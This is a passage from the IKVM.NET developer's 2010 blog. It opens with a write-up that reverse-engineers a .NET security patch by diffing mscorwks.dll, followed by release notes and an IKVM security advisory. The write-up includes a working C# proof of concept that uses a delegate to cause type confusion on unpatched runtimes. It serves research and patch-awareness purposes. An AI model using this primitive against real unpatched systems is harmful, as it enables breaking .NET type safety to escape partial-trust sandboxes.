               2 Dir(s)  105,945,309,184 bytes free</PRE>
<P>OK. So the file sizes are somewhat intimidating. I have the <A href="http://www.microsoft.com/whdc/devtools/debugging/debugstart.mspx">Microsoft symbol server</A> configured, so dumpbin helpfully provided the symbol names, so that makes navigating the files a lot easier. Given the description of the vulnerability, I first looked at how the JIT compiles the construction of a delegate and noticed that it calls the JIT_VirtualFunctionPointer method in mscorwks. I looked at that, but it was unmodified by the patch. I did a little more random browsing through the file but wasn't getting anywhere.</P>
<P><STRONG>The&nbsp; Security Researcher</STRONG></P>
<P>On Wednesday I had gotten an e-mail from a security researcher that wanted to know if I had any details on the vulnerability. I told him I hadn't yet, but was very curious and wanted to look into it. We mailed a couple of times more during the week and on Friday he mailed me a list of addresses of functions that had been changed by the patch. Unfortunately, he was probably looking a different version of the patch (for a different platform), because the addresses didn't make any sense to me.</P>
<P><STRONG>More Searching</STRONG></P>
<P>However, his e-mail did inspire me to take another look and this time I thought, why not start by examining all the functions in mscorwks from the COMDelegate class. From the Shared Source CLI code I knew that was the native class that contained the native code for System.Delegate. After about an hour of comparing methods I finally found a difference:</P>
<P>Unpatched mscorwks.dll (2.0.50727.4927 Windows 7 x86):</P><PRE>  7A04799D: 8B CB              mov         ecx,ebx
  7A04799F: E8 36 B9 E2 FF     call        ?IsValueType@MethodTable@@QAEHXZ
  7A0479A4: 85 C0              test        eax,eax
  7A0479A6: 74 09              je          7A0479B1
  <SPAN style="BACKGROUND-COLOR: yellow">7A0479A8: F6 46 03 04        test        byte ptr [esi+3],4</SPAN>
  <SPAN style="BACKGROUND-COLOR: yellow">7A0479AC: 75 03              jne         7A0479B1</SPAN>
  7A0479AE: 33 FF              xor         edi,edi
  7A0479B0: 47                 inc         edi
  7A0479B1: 6A 06              push        6
  7A0479B3: 6A 01              push        1
  7A0479B5: 6A 00              push        0
  7A0479B7: 6A 00              push        0
  7A0479B9: 51                 push        ecx
  7A0479BA: 51                 push        ecx
  7A0479BB: 8B C4              mov         eax,esp
  7A0479BD: 89 65 C0           mov         dword ptr [ebp-40h],esp
  7A0479C0: 50                 push        eax
  7A0479C1: 8B CE              mov         ecx,esi
  7A0479C3: E8 C7 6D E3 FF     call        ?GetMethodInstantiation@MethodDesc@@&#187;</PRE>
<P>Patched mscorwks.dll (2.0.50727.4952 Windows 7 x86):</P><PRE>  7A0479A3: 8B CF              mov         ecx,edi
  7A0479A5: E8 40 B9 E2 FF     call        ?IsValueType@MethodTable@@QAEHXZ
  7A0479AA: 85 C0              test        eax,eax
  7A0479AC: 74 03              je          7A0479B1
  7A0479AE: 33 DB              xor         ebx,ebx
  7A0479B0: 43                 inc         ebx
  7A0479B1: 6A 06              push        6
  7A0479B3: 6A 01              push        1
  7A0479B5: 6A 00              push        0
  7A0479B7: 6A 00              push        0
  7A0479B9: 51                 push        ecx
  7A0479BA: 51                 push        ecx
  7A0479BB: 8B C4              mov         eax,esp
  7A0479BD: 89 65 C0           mov         dword ptr [ebp-40h],esp
  7A0479C0: 50                 push        eax
  7A0479C1: 8B CE              mov         ecx,esi
  7A0479C3: E8 C7 6D E3 FF     call        ?GetMethodInstantiation@MethodDesc@@&#187;</PRE>
<P>The highlighted code has been removed. This is in the COMDelegate::BindToMethodInfo method. Looking at the Shared Source CLI code it was easy to locate the corresponding code and I noticed that the removed code was probably an inlined call to method-&gt;IsUnboxingStub(). A quick search for IsUnboxingStub in the header files confirmed this.</P>
<P><STRONG>How to Exploit</STRONG></P>
<P>After a minute of reflection, I guessed that the bug was probably related to how value type methods have a different concept of "this" than normal methods (because a non-boxed value doesn't have an object header, which is normally where the this pointer points). To solve this, the runtime generates UnboxingStubs for virtual methods (inherited from System.Object) that are overridden by a value type.</P>
<P>I hit the jackpot with my first attempt. Here is a slightly modified version of what I tried:</P><PRE><SPAN style="COLOR: #0000ff">using</SPAN> System;
<SPAN style="COLOR: #0000ff">using</SPAN> System.Reflection;<BR>
<SPAN style="COLOR: #0000ff">class</SPAN> <SPAN style="COLOR: #2b91af">Union1</SPAN>
{
    <SPAN style="COLOR: #0000ff">internal volatile int</SPAN> i;
    <SPAN style="COLOR: #0000ff">internal volatile int</SPAN> j;
}<BR>
<SPAN style="COLOR: #0000ff">class</SPAN> <SPAN style="COLOR: #2b91af">Union2</SPAN>
{
    <SPAN style="COLOR: #0000ff">internal volatile object</SPAN> o;
    <SPAN style="COLOR: #0000ff">internal volatile int</SPAN>[] arr;
}<BR>
<SPAN style="COLOR: #0000ff">public struct</SPAN> <SPAN style="COLOR: #2b91af">Foo</SPAN>
{
    <SPAN style="COLOR: #0000ff">object</SPAN> obj;
    <SPAN style="COLOR: #2b91af">Union2</SPAN> u2;<BR>
    <SPAN style="COLOR: #0000ff">public</SPAN> Foo(<SPAN style="COLOR: #0000ff">object</SPAN> obj)
    {
        this.obj = obj;
        this.u2 = null;
    }<BR>
    <SPAN style="COLOR: #0000ff">public override string</SPAN> ToString()
    {
        <SPAN style="COLOR: #2b91af">Program</SPAN>.u2 = u2;
        <SPAN style="COLOR: #0000ff">return null</SPAN>;
    }
}<BR>
<SPAN style="COLOR: #0000ff">delegate string</SPAN> <SPAN style="COLOR: #2b91af">MyDelegate</SPAN>();<BR>
<SPAN style="COLOR: #0000ff">class</SPAN> <SPAN style="COLOR: #2b91af">Program</SPAN>
{
    <SPAN style="COLOR: #0000ff">internal static</SPAN> <SPAN style="COLOR: #2b91af">Union2</SPAN> u2;<BR>
    <SPAN style="COLOR: #0000ff">static void</SPAN> Main(<SPAN style="COLOR: #0000ff">string</SPAN>[] args)
    {
        <SPAN style="COLOR: #2b91af">Union1</SPAN> u1 = <SPAN style="COLOR: #0000ff">new</SPAN> <SPAN style="COLOR: #2b91af">Union1</SPAN>();<BR>
        <SPAN style="COLOR: #2b91af">MethodInfo</SPAN> method = <SPAN style="COLOR: #0000ff">typeof</SPAN>(<SPAN style="COLOR: #2b91af">Foo</SPAN>).GetMethod(<SPAN style="COLOR: #a31515">"ToString"</SPAN>);
        <SPAN style="COLOR: #2b91af">MyDelegate</SPAN> d = (<SPAN style="COLOR: #2b91af">MyDelegate</SPAN>)<SPAN style="COLOR: #2b91af">Delegate</SPAN>.CreateDelegate(<SPAN style="COLOR: #0000ff">typeof</SPAN>(<SPAN style="COLOR: #2b91af">MyDelegate</SPAN>), <SPAN style="COLOR: #0000ff">new</SPAN> <SPAN style="COLOR: #2b91af">Foo</SPAN>(u1), method);
        d();<BR>
        <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(u1);
        <SPAN style="COLOR: #2b91af">Console</SPAN>.WriteLine(u2);
    }
}
</PRE>
<P>When you run this code on an unpatched system, you'll see that both WriteLine calls output Union1, in other words, we now have a reference typed as Union2 pointing the a Union1 instance. This is exactly the requirement I described in <A HREF="/PermaLink.aspx?guid=3cc8beef-3424-488d-8429-50e244f15ccc">Writing a .NET Security Exploit PoC</A>.</P>
<P><STRONG>Conclusion</STRONG></P>
<P>A had read before that malware authors can often update their malware within an hour after a patch is released to take advantage of the vulnerabilities addressed by the patch, but actually doing the reverse engineering myself did really drive home the point. It took me a couple of days, had I had the proper tools and the motivation I could have easily done this within an hour or so of the patch release. Of course, I had some help from the Shared Source CLI and without the source it would have taken me a bit longer, but then again I'm not an experienced malware author.</P>
<P>So installing the security updates in a timely fashion is really important.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/14/2010 11:01:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c1e9440e-becc-41a4-bf2a-12c407f07737"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c1e9440e-becc-41a4-bf2a-12c407f07737">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 August 2010</h2></div>
<div class="newsItems"><a name="a263c2edf-4f49-460e-a567-55dcd261300a"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 4</h3>
	<div class="entryBody">
		<P>More bug fixes and another release candidate.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.4</LI>
<LI>Fixed <A href="http://download.oracle.com/javase/6/docs/api/java/lang/Object.html#wait(long, int)">Object.wait()</A> to not throw an exception when a timeout &gt; Integer.MAX_VALUE is used. Thanks to Andy Malakov for reporting this.</LI>
<LI>IKVM.Reflection: Fixed IA64 and x64 import directory alignment.</LI>
<LI>IKVM.Reflection: Fixed bug <A href="https://sourceforge.net/tracker/?func=detail&amp;aid=3040528&amp;group_id=69637&amp;atid=525264">#3040528</A>. Thanks to Ignacio Hernandez-Ros.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.4.zip">ikvmbin-0.44.0.4.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.4.zip">ikvmsrc-0.44.0.4.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/10/2010 08:40:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=263c2edf-4f49-460e-a567-55dcd261300a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=263c2edf-4f49-460e-a567-55dcd261300a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 04 August 2010</h2></div>
<div class="newsItems"><a name="a298d6824-2921-4b6c-a839-d55295d0b001"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 3</h3>
	<div class="entryBody">
		<P>A new release candidate with several bug fixes.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.3</LI>
<LI>Updated HOWTO. Thanks to Dawid Weiss.</LI>
<LI>Fixed <A href="http://download.oracle.com/javase/6/docs/api/java/lang/Process.html#destroy()">Process.destroy()</A> to swallow System.ComponentModel.Win32Exception.</LI>
<LI>Fixed <A href="http://download.oracle.com/javase/6/docs/api/java/util/zip/Inflater.html#finished()">Inflater.finished()</A> to not throw NullPointerException if it is called after <A href="http://download.oracle.com/javase/6/docs/api/java/util/zip/Inflater.html#end()">end()</A> has been called.</LI>
<LI>Fix for bug <A href="https://sourceforge.net/tracker/?func=detail&amp;aid=3035831&amp;group_id=69637&amp;atid=525264">#3035831</A>. Thanks to Dawid Weiss.</LI>
<LI>Fixed issue with reflecting on inner classes of cli.System.Exception.</LI>
<LI>Fixed another verifier regression introduced with try/fault handler changes.</LI>
<LI>Fixed field reflection slow path to throw NullPointerException instead of IllegalArgumentException for instance fields if the instance object is null.</LI>
<LI>Fixed dynamic mode late bound (dynamic) instructions to throw NoClassDefFoundError before NullPointerException.</LI>
<LI>Fixed Inet4AddressImpl.getHostByAddr() to catch System.ArgumentException and throw java.net.UnknownHostException instead.</LI>
<LI>Fixed path canonicalization issue exposed by JRuby (which subclasses java.io.File to use a / file separator on Windows).</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.3.zip">ikvmbin-0.44.0.3.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.3.zip">ikvmsrc-0.44.0.3.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/04/2010 08:35:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=298d6824-2921-4b6c-a839-d55295d0b001"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=298d6824-2921-4b6c-a839-d55295d0b001">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 27 July 2010</h2></div>
<div class="newsItems"><a name="aec7729c4-cf2d-4a2c-89c9-dabe08abcf3b"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 2</h3>
	<div class="entryBody">
		<P>A new release candidate with two bug fixes.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.2</LI>
<LI>Fixed Field.set() bug #<A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=3033769&amp;group_id=69637&amp;atid=525264">3033769</A>.</LI>
<LI>When a protected or public member is accessed in a non-public base class in another assembly that is simultaneously compiled, we need to add an InternalsVisibleTo to the callee assembly for the caller assembly.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.2.zip">ikvmbin-0.44.0.2.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.2.zip">ikvmsrc-0.44.0.2.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/27/2010 08:59:53 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ec7729c4-cf2d-4a2c-89c9-dabe08abcf3b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ec7729c4-cf2d-4a2c-89c9-dabe08abcf3b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a9c01c64e-7498-4845-86e5-0b130d680724"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET Security Update</h3>
	<div class="entryBody">
		<P><STRONG>Potential Security Vulnerability</STRONG></P>
<P>There is a bug IKVM's implementation of <A href="http://java.sun.com/javase/6/docs/api/java/lang/reflect/Field.html#set(java.lang.Object, java.lang.Object)">java.lang.reflect.Field.set()</A>. The dynamic method that is generated doesn't properly cast the value to the type of the field. This is obviously a bug, but it could also lead to a type safety vulnerability. It is not directly exploitable, because the unverifiable dynamic method will do a full trust security demand and when there is partially trusted code on the stack, that will fail.</P>
<P>However, if you have any code that indirectly exposes Field.set() to untrusted code, it may be exploitable. In particular, the following scenarios warrant careful attention:</P>
<UL>
<LI>Having an assembly in the GAC that has the AllowPartiallyTrustedCallerAttribute and exposes Field.set() functionality to partially trusted callers and uses a security assert to stop the stack walk.</LI>
<LI>If you load partially trusted code in your application and your code uses Field.set() on values controlled by the partially trusted code, without any partially trusted code being directly on the stack.</LI>
<LI>If you process data or a (lightweight) scripting language that somehow exposes Field.set() functionality to untrusted data/code.</LI></UL>
<P><STRONG>Affected Versions</STRONG></P>
<P>IKVM.NET version 0.38, 0.40, 0.42 and 0.44 are affected. Version 0.36 and earlier are not affected.</P>
<P><STRONG>Update</STRONG></P>
<P>There is an update of IKVM.NET 0.42, earlier versions will not be updated and there will be a new 0.44 release candidate later today.</P>
<P><STRONG>IKVM.NET 0.42 Update 2</STRONG></P>
<P>Changes:</P>
<UL>
<LI>Updated version to 0.42.0.7.</LI>
<LI>Fixed Field.set() bug #<A href="https://sourceforge.net/tracker/index.php?func=detail&amp;aid=3033769&amp;group_id=69637&amp;atid=525264">3033769</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.42.0.7.zip">ikvmbin-0.42.0.7.zip</A><BR><BR>Sources: <A href="http://www.frijters.net/ikvm-0.42.0.7.zip">ikvm-0.42.0.7.zip</A>, <A href="http://www.frijters.net/openjdk6-b16-stripped.zip">openjdk6-b16-stripped.zip</A></P>
<P><STRONG>Credits</STRONG></P>
<P>Thanks to Dawid Weiss for reporting this issue.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/27/2010 08:57:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9c01c64e-7498-4845-86e5-0b130d680724"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9c01c64e-7498-4845-86e5-0b130d680724">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 12 July 2010</h2></div>
<div class="newsItems"><a name="ae8b18eca-7757-488f-b7ba-1568d7b22602"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 1</h3>
	<div class="entryBody">
		<P>A new release candidate with two bug fixes.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.44.0.1</LI>
<LI>Fixed verifier regression introduced with try/fault handler changes. Thanks to Enrico Minack for reporting this.</LI>
<LI>When a protected field is accessed in a non-public base class in another assembly that is simultaneously compiled, we need to add an InternalsVisibleTo to the callee assembly for the caller assembly.</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.1.zip">ikvmbin-0.44.0.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.1.zip">ikvmsrc-0.44.0.1.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/12/2010 09:09:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e8b18eca-7757-488f-b7ba-1568d7b22602"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e8b18eca-7757-488f-b7ba-1568d7b22602">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 07 July 2010</h2></div>
<div class="newsItems"><a name="a6f3a513b-cba7-497e-be25-82ba96e13f40"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.44 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The first 0.44 release candidate is available.</P>
<P>What's New (relative to IKVM.NET 0.42):</P>
<UL>
<LI>Integrated OpenJDK 6 build 18</LI>
<LI>Bug fixes</LI>
<LI>Code cleanup</LI>
<LI>Many AWT improvements (by Nat and Volker)</LI>
<LI>IKVM.Reflection</LI>
<LI>Ability to build from source targetting .NET 4.0</LI>
<LI>Reflection optimizations</LI>
<LI>Codegen optimizations</LI>
<LI>JNI optimizations</LI>
<LI>Introduced IKVM.OpenJDK.Tools.dll</LI>
<LI>Improved build process (removed dependency on shipping stub jar binaries)</LI>
<LI>Improved ikvmc parameter validation and error handling</LI>
<LI>Annotated all security critical code with .NET 4.0 security model custom attributes</LI>
<LI>Added -nostdlib option to ikvmstub and ikvmc to allow them to work with .NET 4.0 assemblies (while running on .NET 2.0)</LI>
<LI>Implemented RuntimeMXBean and OperatingSystemMXBean</LI>
<LI>Experimental (when built from source, targetting .NET 4.0) support for class GC</LI></UL>
<P>Binary available here: <A href="http://www.frijters.net/ikvmbin-0.44.0.0.zip">ikvmbin-0.44.0.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.44.0.0.zip">ikvmsrc-0.44.0.0.zip</A>, <A href="http://www.frijters.net/openjdk6-b18-stripped.zip">openjdk6-b18-stripped.zip</A></P>
<P>The sources zip no longer contains any binaries.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/07/2010 15:54:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6f3a513b-cba7-497e-be25-82ba96e13f40"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6f3a513b-cba7-497e-be25-82ba96e13f40">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a2432a798-075f-46fc-8f94-631e46e10eef"></a><div class="entry">
	<h3 class="entryTitle">Bug Reports</h3>
	<div class="entryBody">
		<P>I've disabled the ability for anonymous users to post bug reports (and feature requests). Two useless duplicate reports (<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3026137&amp;group_id=69637">3026137</A> and <A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3026140&amp;group_id=69637">3026140</A>) pushed me over the edge.</P>
<P>Some bug reporting tips:</P>
<UL>
<LI>Include all the (possibly) relevant information (IKVM.NET, .NET / Mono and Operating System version numbers, CPU architecture, error messages, warning messages).</LI>
<LI>Try to create a small repro that demonstrates the problem. Make sure it compiles, don't just include a non-compiling code snippet.</LI>
<LI>Clearly separate fact from speculation.</LI>
<LI>Read this excellent essay on <A href="http://www.chiark.greenend.org.uk/~sgtatham/bugs.html">How to Report Bugs Effectively</A> by Simon Tatham.</LI></UL>
<P>P.S.&nbsp; In the case of the above bug report, the poster tried to look at the code for ServerSocket.accept() with Reflector and Reflector crashed. <STRONG>This is a Reflector bug</STRONG>, it simply doesn't understand the code constructs that ikvmc generates (<STRONG>even though they are perfectly valid</STRONG>).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/07/2010 14:11:51 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2432a798-075f-46fc-8f94-631e46e10eef"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2432a798-075f-46fc-8f94-631e46e10eef">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 30 June 2010</h2></div>
<div class="newsItems"><a name="a96fac07c-59ac-4090-b86e-38514d6a349a"></a><div class="entry">
	<h3 class="entryTitle">IKVM.Reflection Testing</h3>
	<div class="entryBody">
		<P>I decided to do some brute force testing of IKVM.Reflection. I ran my <A href="http://www.frijters.net/LinkerPrototype.zip">LinkerPrototype</A> on almost all assemblies in the .NET and Mono GACs. This resulted in a number of fixes to the linker (but note that it's still just a toy) and a bunch of fixes to IKVM.Reflection. Most of these fixes aren't relevant for IKVM.NET, but I want IKVM.Reflection to be useful as a general System.Reflection replacement.</P>
<P>Fixes:</P>
<UL>
<LI>MethodInfo.DeclaringType should return null for global generic method instances.</LI>
<LI>Fixed support for TypeSpec in custom modifiers.</LI>
<LI>Fixed bug that caused duplicate MethodSpec rows to be emitted.</LI>
<LI>Fixed bug that caused duplicate MemberRef rows to be emitted.</LI>
<LI>Allow use of generic method definition in IL stream.</LI>
<LI>Made signature binding lazy for GenericMethodInstance.</LI>
<LI>Allow declarative security attributes to use non-public constructors.</LI>
<LI>Implemented ManifestResourceInfo.FileName property.</LI>
<LI>Implemented workaround for incorrect exception table length in methods generated by VB compiler.</LI>
<LI>Fixed exception filter block handling to support having both regular handlers and a filter for the same try block.</LI>
<LI>Fixed metadata header to account for the actual ImageRuntimeVersion string length, instead of assuming it to be "v2.0.50727".</LI>
<LI>Implemented __GetDeclaredMethods() for ArrayType and MultiArrayType.</LI>
<LI>Fixed two MarshalSpec blob parsing bugs.</LI>
<LI>Fixed several places where generic type definitions would be encoded as TypeDef token instead of TypeSpec.</LI>
<LI>Re-instroduced generic type instantation for "identity" instantations of TypeBuilder types.</LI>
<LI>Several fixes for C++/CLI that tends to stick custom modifiers everywhere. Also, support void&amp; in local variable signature.</LI>
<LI>Support fields that have an RVA, but where it is set to zero (C++/CLI does this).</LI>
<LI>Added support for a TypeRef with a null ResolutionScope.</LI></UL>
<P>The source is available in cvs and the LinkerPrototype zip link above contains the most recent IKVM.Reflection.dll, but if you want just the IKVM.Reflection.dll binary, it is available here: <A href="http://www.frijters.net/ikvm-reflect-0.43.3833.zip">ikvm-reflect-0.43.3833.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/30/2010 10:47:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=96fac07c-59ac-4090-b86e-38514d6a349a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=96fac07c-59ac-4090-b86e-38514d6a349a">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="abcd3758c-9998-43ce-bfb0-b088a73e1765"></a><div class="entry">
	<h3 class="entryTitle">Apache PDFBox 1.2.0 Released</h3>
	<div class="entryBody">
		<P>Yesterday the release of <A href="http://pdfbox.apache.org/">Apache PDFBox</A> 1.2.0 was <A href="http://markmail.org/message/tyq7qztsaffho7rt">announced</A>. Thanks to <A href="https://issues.apache.org/jira/browse/PDFBOX-675">Daniel Wilson</A> the included Ant <A href="http://pdfbox.apache.org/userguide/dot_net.html">build script</A> to build the .NET version has been updated to work with IKVM.NET 0.42.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/30/2010 08:50:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=bcd3758c-9998-43ce-bfb0-b088a73e1765"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=bcd3758c-9998-43ce-bfb0-b088a73e1765">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 June 2010</h2></div>
<div class="newsItems"><a name="a85c0a4a3-86b8-4feb-a6a5-e6abcceb7c10"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>One more development snapshot. A couple of minor tweaks.</P>
<P>Changes:</P>
<UL>
<LI>Updated copyright notices.</LI>
<LI>Removed Winforms thread workaround timer that was previously required to make the thread abortable.</LI>
<LI>IKVM.Reflection: Fixed a couple of bugs related to escaped type names not being unescaped.</LI>
<LI>IKVM.Reflection: Changed assembly reference caching to be more efficient and to handle the fact that assembly identities can change (if it is an AssemblyBuilder).</LI>
<LI>IKVM.Reflection: Changed assembly identity caching to only add identities to the cache&nbsp;when they are used to look up the assembly.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.43.3824.zip">ikvmbin-0.43.3824.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/21/2010 10:36:02 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=85c0a4a3-86b8-4feb-a6a5-e6abcceb7c10"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=85c0a4a3-86b8-4feb-a6a5-e6abcceb7c10">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 14 June 2010</h2></div>
<div class="newsItems"><a name="a7dece396-5233-4f82-9925-a2edcb400ec0"></a><div class="entry">
	<h3 class="entryTitle">CLR JIT Bugs Found During IKVM.NET Development</h3>
	<div class="entryBody">
		<P><EM>"It is actually fairly common that people notice that things fail under retail but not debug and tend to blame code generation.<BR>While a code generation bug is possible, as a matter of statistics, it is not likely."</EM> -- <A href="http://blogs.msdn.com/b/vancem/">Vance Morrison</A><BR><BR></P>
<TABLE style="WIDTH: 100%">
<TBODY>
<TR>
<TD><STRONG>Date</STRONG></TD>
<TD><STRONG>CLR</STRONG></TD>
<TD><STRONG>Arch</STRONG></TD>
<TD><STRONG>Type</STRONG></TD>
<TD><STRONG>Description</STRONG></TD></TR>
<TR>
